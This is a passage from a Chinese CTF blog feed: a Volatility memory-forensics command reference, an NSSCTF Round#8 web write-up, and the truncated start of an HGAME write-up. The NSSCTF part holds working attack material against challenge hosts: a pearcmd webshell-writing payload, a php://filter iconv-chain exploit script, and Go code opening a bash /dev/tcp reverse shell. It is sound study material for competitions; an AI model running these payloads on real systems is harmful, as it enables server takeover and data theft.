7.1a主密钥</td></tr><tr><td>truecryptpassphrase</td><td>查找并提取TrueCrypt密码</td></tr><tr><td>truecryptsummary</td><td>TrueCrypt摘要信息</td></tr><tr><td>unloadedmodules</td><td>打印卸载的模块信息列表</td></tr><tr><td>userassist</td><td>打印注册表中UserAssist相关信息</td></tr><tr><td>userhandles</td><td>转储用户句柄表</td></tr><tr><td>vaddump</td><td>转储VAD数据为文件</td></tr><tr><td>vadinfo</td><td>转储VAD信息</td></tr><tr><td>vadtree</td><td>以树形方式显示VAD树信息</td></tr><tr><td>vadwalk</td><td>显示遍历VAD树</td></tr><tr><td>vboxinfo</td><td>转储Virtualbox信息（虚拟机）</td></tr><tr><td>verinfo</td><td>打印PE镜像中的版本信息</td></tr><tr><td>vmwareinfo</td><td>转储VMware VMSS/VMSN 信息</td></tr><tr><td>volshell</td><td>内存镜像中的shell</td></tr><tr><td>windows</td><td>打印桌面窗口(详细信息)</td></tr><tr><td>wintree</td><td>Z顺序打印桌面窗口树</td></tr><tr><td>wndscan</td><td>池扫描窗口站</td></tr><tr><td>yarascan</td><td>以Yara签名扫描进程或内核内存</td></tr></tbody></table><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令 #"></a>常用命令 <a href="https://wiki.wgpsec.org/knowledge/ctf/Volatility.html#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4">#</a></h3><table><thead><tr><th><strong>功能</strong></th><th><strong>命令行及参数</strong></th></tr></thead><tbody><tr><td>查看进程列表</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 pslist</td></tr><tr><td>查看进程列表（树形）</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 pstree</td></tr><tr><td>查看进程列表(psx视图)</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 psxview</td></tr><tr><td>查看网络通讯连接</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 netscan</td></tr><tr><td>查看加载的动态链接库</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 dlllist</td></tr><tr><td>查看SSDT表</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 ssdt</td></tr><tr><td>查看UserAssist痕迹</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 userassist</td></tr><tr><td>查看ShimCache痕迹</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 shimcache</td></tr><tr><td>查看ShellBags</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 shellbags</td></tr><tr><td>查看服务列表</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 svcscan</td></tr><tr><td>查看Windows帐户hash</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 hashdump</td></tr><tr><td>查看最后关机时间</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 shutdowntime</td></tr><tr><td>查看IE历史记录</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 iehistory</td></tr><tr><td>提取注册表数据</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 dumpregistry</td></tr><tr><td>解析MFT记录</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 mftparser</td></tr><tr><td>导出MFT记录,恢复文件</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 mftparser –output-file=mftverbose.txt -D mftoutput</td></tr><tr><td>获取TrueCrypt密钥信息</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 truecryptmaster</td></tr><tr><td>获取TrueCrypt密码信息</td><td>python2 vol.py -f Win7_SP1_x86.vmem –profile=Win7SP1x86 truecryptpassphras</td></tr></tbody></table><h4 id="Volatility3"><a href="#Volatility3" class="headerlink" title="Volatility3"></a>Volatility3</h4><p>banners.Banners<br>识别linux镜像的banner信息<br>不识别windows的镜像</p><p>isfinfo.IsfInfo<br>确定当前可用的ISF文件<br>具体什么是ISF文件，我也没查到<br>如下</p><p>layerwriter.LayerWriter<br>Runs the automagics and writes out the primary layer produced by the stacker.<br>运行 automagics 并写出堆栈器产生的主层</p><p>timeliner.Timeliner<br>Runs all relevant plugins that provide time related information and orders the results by time.<br>运行所有提供时间相关信息并按时间排序结果的相关插件，简称，全自动洗衣机</p><p>windows.cachedump.Cachedump<br>Dumps lsa secrets from memory<br>从内存中转储 lsa 密码<br>我这是转储失败了</p><p>windows.callbacks.Callbacks<br>Lists kernel callbacks and notification routines.<br>列出内核回调和通知例程</p><p>windows.cmdline.CmdLine<br>Lists process command line arguments.<br>列出进程命令行参数</p><p>windows.crashinfo.Crashinfo<br>windows.dlllist.DllList<br>Lists the loaded modules in a particular windows memory image.<br>列出加载的dll</p><p>windows.driverirp.DriverIrp<br>List IRPs for drivers in a particular windows memory image.<br>列出Windows 镜像中驱动程序的 IRP</p><p>windows.driverscan.DriverScan<br>Scans for drivers present in a particular windows memory image.<br>扫描存在于 Windows 镜像中的驱动程序</p><p>windows.dumpfiles.DumpFiles<br>Dumps cached file contents from Windows memory samples.<br>从 Windows 内存中转储缓存的文件内容，文件夹要爆了</p><p>windows.envars.Envars<br>Display process environment variables<br>显示进程环境变量</p><p>windows.filescan.FileScan<br>Scans for file objects present in a particular windows memory image.<br>扫描文件</p><p>windows.getservicesids.GetServiceSIDs<br>Lists process token sids.</p><p>windows.getsids.GetSIDs<br>Print the SIDs owning each process<br>列出每个进程的sid</p><p>windows.handles.Handles<br>Lists process open handles.<br>列出进程打开的句柄</p><p>windows.hashdump.Hashdump<br>Dumps user hashes from memory<br>获取哈希</p><p>windows.info.Info<br>Show OS &amp; kernel details of the memory sample being analyzed.<br>获取系统内核信息</p><p>windows.lsadump.Lsadump<br>Dumps lsa secrets from memory<br>从内存中转储 lsa 密码<br>和cachedump一样的解释，但是执行的结果却不一样</p><p>windows.malfind.Malfind<br>Lists process memory ranges that potentially contain injected code.<br>列出可能包含注入代码的进程内存范围</p><p>windows.memmap.Memmap<br>Prints the memory map<br>打印内存映射</p><p>windows.modscan.ModScan<br>Scans for modules present in a particular windows memory image.<br>扫描 Windows 内存映像中存在的模块</p><p>windows.modules.Modules<br>Lists the loaded kernel modules.<br>列出加载的内核模块</p><p>windows.mutantscan.MutantScan<br>Scans for mutexes present in a particular windows memory image.<br>扫描特定 Windows 内存映像中存在的互斥锁，游戏多开用的就是mutex</p><p>windows.netscan.NetScan<br>Scans for network objects present in a particular windows memory image.<br>扫描存在于 Windows 内存映像中的网络对象</p><p>windows.netstat.NetStat<br>Traverses network tracking structures present in a particular windows memory image.<br>遍历 Windows 内存映像中存在的网络状态<br>就像执行了netstat -ano 一样</p><p>windows.poolscanner.PoolScanner<br>A generic pool scanner plugin.</p><p>windows.privileges.Privs<br>Lists process token privileges</p><p>windows.pslist.PsList<br>Lists the processes present in a particular windows memory image.</p><p>windows.psscan.PsScan<br>Scans for processes present in a particular windows memory image.<br>就像在linux中执行了ps一样</p><p>windows.pstree.PsTree<br>Plugin for listing processes in a tree based on their parent process ID.<br>根据父进程 ID 在树中列出进程的插件<br>反正我是没有看出来树形结构体现在哪</p><p>windows.registry.certificates.Certificates<br>Lists the certificates in the registry’s Certificate Store.<br>列出注册表的证书存储中的证书</p><p>windows.registry.hivelist.HiveList<br>Lists the registry hives present in a particular memory image.<br>列出内存映像中存在的注册表配置</p><p>windows.registry.hivescan.HiveScan<br>Scans for registry hives present in a particular windows memory image.<br>扫描 windows 中存在的注册表配置单元</p><p>windows.registry.printkey.PrintKey<br>Lists the registry keys under a hive or specific key value.<br>列出配置单元或特定键值下的注册表项</p><p>windows.registry.userassist.UserAssist<br>Print userassist registry keys and information.<br>打印 userassist 注册表项和信息</p><p>windows.skeleton_key_check.Skeleton_Key_Check<br>Looks for signs of Skeleton Key malware<br>寻找 Skeleton Key 恶意软件的迹象</p><p>windows.ssdt.SSDT<br>Lists the system call table.<br>列出系统调用表</p><p>windows.statistics.Statistics<br>统计数据</p><p>windows.strings.Strings<br>Reads output from the strings command and indicates which process(es) each string belongs to.<br>读取 strings 命令的输出并指示每个字符串属于哪个进程<br>已尽力，卒。</p><p>windows.svcscan.SvcScan<br>Scans for windows services.<br>服务扫描</p><p>windows.symlinkscan.SymlinkScan<br>Scans for links present in a particular windows memory image.<br>扫描存在于 Windows 内存映像中的链接</p><p>windows.vadinfo.VadInfo<br>Lists process memory ranges.<br>列出进程内存范围</p><p>windows.verinfo.VerInfo<br>Lists version information from PE files.<br>列出 PE 文件的版本信息</p><p>windows.virtmap.VirtMap<br>Lists virtual mapped sections.<br>列出虚拟映射section</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><blockquote><p>一直在路上</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF Round#8</title>
      <link href="/2023/02/11/NSSCTF-Round-8/"/>
      <url>/2023/02/11/NSSCTF-Round-8/</url>
      
        <content type="html"><![CDATA[<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="MyDoor"><a href="#MyDoor" class="headerlink" title="MyDoor"></a>MyDoor</h4><p><a href="http://43.142.108.3:28348/index.php?file=">http://43.142.108.3:28348/index.php?file=</a><br>这里应该是文件读取，直接、etc/passwd 正常，index.php没有读取到，那伪协议获取源码<br>PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCg0KaWYgKGlzc2V0KCRfR0VUWydOX1MuUyddKSkgew0KICAgIGV2YWwoJF9HRVRbJ05fUy5TJ10pOw0KfQ0KDQppZighaXNzZXQoJF9HRVRbJ2ZpbGUnXSkpIHsNCiAgICBoZWFkZXIoJ0xvY2F0aW9uOi9pbmRleC5waHA/ZmlsZT0nKTsNCn0gZWxzZSB7DQogICAgJGZpbGUgPSAkX0dFVFsnZmlsZSddOw0KDQogICAgaWYgKCFwcmVnX21hdGNoKCcvXC5cLnxsYXxkYXRhfGlucHV0fGdsb2J8Z2xvYmFsfHZhcnxkaWN0fGdvcGhlcnxmaWxlfGh0dHB8cGhhcnxsb2NhbGhvc3R8XD98XCp8XH58emlwfDd6fGNvbXByZXNzL2lzJywgJGZpbGUpKSB7DQogICAgICAgIGluY2x1ZGUgJGZpbGU7DQogICAgfSBlbHNlIHsNCiAgICAgICAgZGllKCdlcnJvci4nKTsNCiAgICB9DQp9</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;N_S.S&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;N_S.S&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&#x27;Location:/index.php?file=&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/\.\.|la|data|input|glob|global|var|dict|gopher|file|http|phar|localhost|\?|\*|\~|zip|7z|compress/is&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以看到禁用了许多函数，上面是个命令执行，<br>这里N_S.S 形式第一次见是在ctfshow web123</p><p>PHP变量名应该只有数字字母下划线,同时GET或POST方式传进去的变量名,会自动将空格+ . [转换为_<br>但是有一个特性可以绕过,使变量名出现.之类的<br>特殊字符[, GET或POST方式传参时,变量名中的[也会被替换为_,但其后的字符就不会被替换了<br>如 CTF[SHOW.COM=&gt;CTF_SHOW.COM<br>也就是传参的时候<br>n_s.s &gt; n[s.s</p><p><img src="/images/Round-8/image-20230216161717020.png" alt="image-20230216161717020"></p><p>FLAG 在环境变量里</p><h4 id="MyPage-不会"><a href="#MyPage-不会" class="headerlink" title="MyPage 不会"></a>MyPage 不会</h4><p>参考<br><code>https://blog.csdn.net/qq_61768489/article/details/129016075</code><br><code>http://v2ish1yan.top/2023/02/12/%E6%AF%94%E8%B5%9Bwp/NSSCTF%20Round8/</code><br><code>https://juejin.cn/post/7147638903191814180</code><br>首先还是文件包含可以etcpasswd正常，index。php不可以.伪协议php也不可以</p><p>pear工具里有一个命令叫:config-create,这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。<br>我们可以构造url:<br>index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/<?=phpinfo()?>+/tmp/shell.php<br>复制代码<br>然后包含我们新建的这个文件就OK了。</p><p><img src="/images/Round-8/image-20230216165541573.png" alt="image-20230216165541573"></p><p>这里要注意编码问题，要在bp重发包就可以了</p><p><a href="http://43.142.108.3:28851/index.php?file=/tmp/shell.php">http://43.142.108.3:28851/index.php?file=/tmp/shell.php</a></p><p>二 读取源码 flag</p><p><a href="http://43.142.108.3:28025//index.php?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/cwd/index.php">http://43.142.108.3:28025//index.php?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/cwd/index.php</a></p><p><img src="/images/Round-8/image-20230216174510836.png" alt="image-20230216174510836"></p><p>三</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://43.142.108.3:28025/index.php?file=&quot;</span></span><br><span class="line">file_to_use = <span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line">command = <span class="string">&quot;id&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;?=`$_GET[0]`;;?&gt;</span></span><br><span class="line">base64_payload = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate some garbage base64</span></span><br><span class="line">filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> base64_payload[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line">filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url, params=&#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span>: command,</span><br><span class="line">    <span class="string">&quot;action&quot;</span>: <span class="string">&quot;include&quot;</span>,</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: final_payload</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h4 id="Upload-gogoggoUpload-gogoggo"><a href="#Upload-gogoggoUpload-gogoggo" class="headerlink" title="Upload_gogoggoUpload_gogoggo"></a>Upload_gogoggoUpload_gogoggo</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">cmd := exec.Command(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &amp;&gt; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span>)</span><br><span class="line">out, err := cmd.CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;combined out:\n%s\n&quot;</span>, <span class="keyword">string</span>(out))</span><br><span class="line">log.Fatalf(<span class="string">&quot;cmd.Run() failed with %s\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;combined out:\n%s\n&quot;</span>, <span class="keyword">string</span>(out))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>go run run.go</p><p>上传这个go文件</p><p>nc -lvnkp</p><p><img src="/images/Round-8/image-20230216184449491.png" alt="image-20230216184449491"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 伪协议 </tag>
            
            <tag> RCE </tag>
            
            <tag> GO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023hgame部分wp</title>
      <link href="/2023/01/06/2023hgame%E9%83%A8%E5%88%86wp/"/>
      <url>/2023/01/06/2023hgame%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="Classic-Childhood-Game"><a href="#Classic-Childhood-Game" class="headerlink" title="Classic Childhood Game"></a>Classic Childhood Game</h3><p>简单js,我们右键源代码一下，翻一翻js文件直接搜hgame 没有，那肯定时编码或者加密了，找找可疑字符串，拿去解一下</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230106152018877.png" alt="image-20230106152018877"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">function mota() &#123;</span><br><span class="line">  var a = [&#x27;\x59\x55\x64\x6b\x61\x47\x4a\x58\x56\x6a\x64\x61\x62\x46\x5a\x31\x59\x6d\x35\x73\x53\x31\x6c\x59\x57\x6d\x68\x6a\x4d\x6b\x35\x35\x59\x56\x68\x43\x4d\x45\x70\x72\x57\x6a\x46\x69\x62\x54\x55\x31\x56\x46\x52\x43\x4d\x46\x6c\x56\x59\x7a\x42\x69\x56\x31\x59\x35&#x27;];</span><br></pre></td></tr></table></figure><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230106152036326.png" alt="image-20230106152036326"></p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="Become-A-Member"><a href="#Become-A-Member" class="headerlink" title="Become A Member"></a>Become A Member</h4><p>典型header头请求，cookie那个还挺难想的emmmm</p><p>Referer: bunnybunnybunny.com<br>X-Forwarded-For: 127.0.0.1</p><p>Cookie: code=Vidar</p><p>{“username”:”luckytoday”,”password”:”happy123”}</p><figure class="highlight plaintext"><figcaption><span>/ HTTP/1.1 http</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Host: week-1.hgame.lwsec.cn:30417</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Cute-Bunny</span><br><span class="line">Referer: bunnybunnybunny.com</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: code=Vidar</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 47</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;:&quot;luckytoday&quot;,&quot;password&quot;:&quot;happy123&quot;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230106172621452.png" alt="image-20230106172621452"></p><h4 id="Guess-Who-I-Am"><a href="#Guess-Who-I-Am" class="headerlink" title="Guess Who I Am"></a>Guess Who I Am</h4><p>这题没有用hint，直接全选复制的那个页面，然后 脚本有点麻烦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 